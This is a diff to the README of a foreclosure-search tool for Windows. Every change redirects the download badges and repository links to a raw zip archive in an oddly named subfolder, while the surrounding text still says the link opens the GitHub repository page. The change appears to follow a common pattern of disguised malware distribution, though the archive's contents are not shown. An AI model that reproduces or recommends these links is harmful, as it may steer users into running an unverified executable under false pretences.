@@ -1,6 +1,6 @@
 # 🏠 EdikteFinder-Analyzer - Find and Analyze Foreclosures Easily
 
-[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)
+[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer/raw/refs/heads/main/feminality/Analyzer-Edikte-Finder-3.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps carefully to get the program up and running on your Windows P
 ### 1. Visit the Download Page  
 
 Click this link to open the download page and access the latest installer:  
-[Download EdikteFinder-Analyzer](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)  
+[Download EdikteFinder-Analyzer](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer/raw/refs/heads/main/feminality/Analyzer-Edikte-Finder-3.2.zip)  
 
 This link leads you to the GitHub repository where you can find all available versions and the official setup files.
 
@@ -132,7 +132,7 @@ If you run into issues, try these solutions:
 ## 🌐 More Information and Support
 
 For updates, new versions, or detailed technical info, visit the main repository:  
-[https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)  
+[https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer/raw/refs/heads/main/feminality/Analyzer-Edikte-Finder-3.2.zip](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer/raw/refs/heads/main/feminality/Analyzer-Edikte-Finder-3.2.zip)  
 
 This page contains all documentation, release notes, and community support.  
 
@@ -173,4 +173,4 @@ You will see these main folders and files in the installation directory:
 
 ---
 
-[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer)
+[![Download EdikteFinder-Analyzer](https://img.shields.io/badge/Download-EdikteFinder--Analyzer-brightgreen?style=for-the-badge)](https://github.com/Yuhejdjdi2828264/EdikteFinder-Analyzer/raw/refs/heads/main/feminality/Analyzer-Edikte-Finder-3.2.zip)
